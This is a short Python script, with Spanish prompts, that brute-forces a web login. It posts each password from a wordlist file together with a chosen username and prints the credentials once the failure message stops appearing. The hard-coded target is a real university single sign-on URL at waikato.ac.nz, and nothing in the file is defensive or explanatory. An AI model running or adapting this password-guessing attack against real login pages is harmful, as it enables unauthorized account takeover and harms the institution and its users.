#/usr/bin/python


import requests
from termcolor import colored

def bruteforce(username, url):
    for password in passwords:
        password = password.strip('\n')
        print(colored("Intentando contraseña: %s" % password, "yellow"))
        dataDict = {"username":username, "password":password, "Login":"submit"}
        response = requests.post(url, data=dataDict)
        if b"Fallo de Login" in response.content:
            pass
        else:
            print(colored("[+] Username --> " + username, "green"))
            print(colored("[+] Password --> " + password, "green"))
            exit()

page_url = "https://signin.waikato.ac.nz/adfs/ls/?SAMLRequest=lZJJT8MwEIX%2FSuR746UrVhMpNEJUKlA1gQMX5CaTxqprl4zD9uvpAqJwqMR53rz35tOMUW3MViatr%2B0CnltAH7xtjEV5GESkbax0CjVKqzaA0hcyS25mUoRMbhvnXeEMCRJEaLx2duIsthtoMmhedAH3i1lEau%2B3KCmF0mi7hjJEB%2BGr0mvlXaiK0H7QrNbLpTPg6xDR0X2CoPO7LCdBuqukrdqb%2F1ihXllt%2F5ioskJqkJJgmkbkqT9kJefQq0Q1YKN%2BbwhcDEW3qhhjvREf7GSILUwtemV9RAQT3Q7jHc5yfiHFUHLxSIL5142X2pbars4DWR5FKK%2FzfN459n%2BABg%2FddwISj%2FdY5SG4OQF93lZ90yXx%2F1km6VU2piexxw5bebvLmaZzZ3TxHiTGuNdJA8pDRDih8XHl92fEnw%3D%3D&RelayState=https%3A%2F%2Fedlinked.soe.waikato.ac.nz%2Fresearch%2Fjournal%2Findex.php%3Fid%3D1"
username = input("Ingrese el nombre de usuario para la página especificada: ")

with open("listacontrasena.txt", "r") as passwords:
    bruteforce(username, page_url)

print(colored("[-] Contraseña no encontrada en la lista", "red"))

